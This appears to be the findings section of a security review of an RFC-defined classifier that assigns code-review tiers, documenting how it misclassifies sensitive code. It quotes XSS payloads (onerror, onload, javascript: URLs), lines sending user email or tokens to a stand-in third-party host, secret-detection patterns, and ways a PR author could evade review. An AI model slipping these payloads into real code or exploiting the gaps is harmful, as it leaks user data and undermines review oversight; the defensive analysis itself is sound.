## 3. Findings

### A1-1 (Medium; merge condition on the text, code before §9): H for auth, billing and publishing rests on exact path words, so most of that logic classifies as M

§3 says H covers "auth, sessions, IAM, tenancy ... billing, payments ... publishing". The classifier decides that by an exact
word list on the path (§4.2 item 3). A module whose key is not on the list, with files whose names are not on the list, is M,
and M has no A1 reading. Measured, each with a module test in the diff:

```
M  src/modules/identity/domain/verify.ts      (line: compareHash(u.hash, h))
M  src/modules/accounts/domain/signin.ts
M  src/modules/members/domain/authorize.ts
M  src/modules/identity/domain/authentication.ts
M  src/modules/identity/domain/jwt.ts
M  src/modules/identity/domain/mfa.ts
M  src/modules/identity/domain/oauth2.ts       ("oauth2" is one word; "oauth" does not match it)
M  src/modules/subscriptions/domain/invoice.ts
M  src/modules/orders/domain/refund.ts
M  src/modules/scheduler/domain/post-to-facebook.ts
M  src/modules/uploads/domain/storage.ts
```

A word list cannot be made wide enough; it is a denylist, and a denylist fails open on the next synonym. The fail-closed form
is an **allowlist of modules**: a module is M-eligible only if a reviewed registry (with RFC-2026-029's module layout) names
it as M-eligible; every other module key, and every module that owns identity, tenancy, IAM, sessions, secrets, billing,
entitlement, publishing, connectors or uploads, is H. Keep the word list as an additional raise, matched on prefixes
(`auth*`, `sign(in|up|out)`, `jwt`, `sso`, `saml`, `oidc`, `mfa`, `otp`, `passkey`, `invoice`, `refund`, `payout`,
`subscription`, `charge`, `upload`, `consent`, `pii`), not on whole words.

**Condition (text, before the merge):** §4.2 and §9 say the M and L rules do not apply until such a module allowlist is in
the classifier, with a test per module class; until then a module path is H. Q-030-4's "wide list" answer does not cover
this, because the question is allowlist vs denylist, not wide vs narrow. The code is owed before §9, not in this PR.

### A1-2 (Medium; precondition for §9, recorded in the text): the secret, payment and OAuth line signals use `\b` and miss the identifiers code actually uses

`H_LINE_SIGNALS` match `\bpassword\b`, `\bapi[_-]?key\b`, `\bstripe\b`, `\boauth\b` and so on. `_` and letters are word
characters, so camelCase and SCREAMING_SNAKE identifiers do not match. Measured with `lineSignals`:

```
miss  const h = hashPassword(p);         miss  const s = env.DB_PASSWORD;
miss  const c = stripeClient.charges;    miss  oauth_client_id
miss  const k = userApiKey;              miss  const x = process["env"].X
miss  const s = webhookSecret;           miss  const {env} = process; env.X
miss  const t = await getAccessToken();  miss  Deno.env.get("X")
H     const t = refreshToken;            H     const x = SUPABASE_SERVICE_ROLE_KEY
```

Split identifiers into sub-words the way `pathWords` splits paths, and match the sub-words; treat any `env` member access as
the environment. **Condition:** the RFC lists this fix, with a test reproducing each miss above, among what must exist before
§9 puts M or L in effect.

### A1-3 (Low; precondition for L, recorded in the text): "no data path" and the injection sinks are denylists that L passes around

Every line below classified **L** (one independent Reviewer, no A1):

```
L  import { getMe } from '../lib/data'; const me = await getMe();       (data through an import)
L  <form action={save}>  with save from '../app/actions'                (a server-action write)
L  <img src={`https://third.example/p?u=${user.email}`} />             (personal data to a third party)

L  window.location.href = "https://third.example/?t=" + t;

L  body{background:url(https://third.example/t.png)}  /  @import url("https://third.example/x.css");
L  navigator.geolocation.getCurrentPosition(cb)  /  window.parent.postMessage(data, '*')  /  await import('../lib/data')
L  svg: onload="alert(1)"  /  href="javascript:alert(1)"  /  <foreignObject>     (apps/web/public, served same-origin)
L  ref.current.innerHTML = html  /  el.insertAdjacentHTML(...)  /  document.write(s)  /  setTimeout("doIt()", 1)
L  <a href={props.url}>   /   messages/th.json: "<img src=x onerror=alert(1)>"
```

The third-party request lines are a privacy matter in their own right: personal data leaving the browser to a third party is
exactly what A1 reads, and L skips A1. For L, invert the test: added lines in an L file may import only from L paths and an
allowlisted package list, may carry no absolute or protocol-relative URL, no `action=`, no `on*=` attribute or `javascript:`
in SVG, no `innerHTML`/`outerHTML`/`insertAdjacentHTML`/`document.write`/string timers, and no `navigator.`, `postMessage`,
`window.location` or dynamic `import(`; a public SVG is not L. **Condition:** recorded in the RFC as a precondition of L.

### A1-4 (Medium; merge condition on the text): the PR's head decides its own tier, so a PR that edits the classifier can classify itself

§4 and §3.1 say the PR records `node scripts/db/classify-review-tier.mjs`'s output and each reader "repeats the command on
the head it reads"; §10 item 2's CI step is not specified further. Run that way, the script is the **head's** copy. Probe on a
throwaway branch: the classifier edited so that `classifyTier` returns `L`, committed, then run from the head:

```

tier: H (1 path(s), 95f2d11..173f13c)                        <- 95f2d115's copy, same range: "an H word in the path (db)"

```

The same holds for an edit to `classify-records-only.mjs`, which the tier classifier imports. This turns "decided by a
script, never by the Author" into "decided by a script the Author can edit in the same PR". **Condition (text):** §4 and
§10 item 2 say the tier is computed by the classifier **as it is on the base** (`origin/main`, e.g. from a checkout or
`git show` of the base revision into a temporary directory), never by the head's copy; that a readers' or CI's tier from the
head's copy is void; and that a PR touching either classifier is H regardless of what any copy prints.

### A1-5 (Low; merge condition on the text): at M and L the Author's run can merge its own PR with no independent integration reading

§3.1: "A0 may press the merge of an M, L or records PR under the standing delegation", and §3.2 moves R0's verdict to the end
of the package. A0 has authored every WP-0A-DB-00 PR so far. So for M and L, the Author's run would integrate its own work,
and the first independent integration reading could be up to 10 PRs or 7 days later. §2's first bullet says an Author never
"integrates" its own work, at any tier. The two sentences disagree. For records-only PRs RFC-2026-025 §6 has an independent
reader before the merge; M and L have Reviewer and Tester, but neither checks the merge itself. **Condition (text):** either
(a) the merge of an M or L PR is pressed by a run that is not the Author's, or (b) §2 states that pressing the merge on
recorded Reviewer and Tester verdicts for the exact merged head, CI green and `--match-head-commit`, is not "integration",
and names the deferred §3.2 verdict as the integration step. Put it to the Owner as Q-030-5. A1 prefers (a).

### A1-6 (Low; precondition, recorded in the text): removed lines are never read

Signals are read on added lines only. A change that only deletes lines -- a feature-flag guard in an L component, a tenant
check or an escaping call in module logic -- has no signal: an L file with only removed lines is **L** (measured), and a
module file with only removed lines plus a test touch is **M**. Removing the flag guard defeats §4.3's "behind a flag" by
itself. Recommend: an L file whose diff removes lines is at least M, and removed lines in module logic that match guard,
tenant, permission or sanitize patterns raise to H.

### A1-7 (Info): M's test rule and module config files

Any modification of a test file in the module satisfies "with tests": a one-line comment (`// touch`) or a JSON fixture under
`__tests__/` does (measured: M). `src/modules/<key>/package.json` and `tsconfig.json` are M paths (measured), and a
`package.json` can carry lifecycle scripts or dependencies. Recommend that `package.json`, `tsconfig*.json` and any tool
configuration anywhere be H, and that the Reviewer at M confirm the test exercises the changed code.

### A1-8 (Info): neutral paths carry any file type unscanned

`evidence/<package>/**` is neutral for any extension: an L PR plus `evidence/WP-X/payload.mjs` containing `process.env.SECRET`
stays **L** (measured). Nothing executes evidence, and the repository secret scan still covers it, so this is not a hole
today. Recommend restricting neutral evidence to `.md` and `.json`.
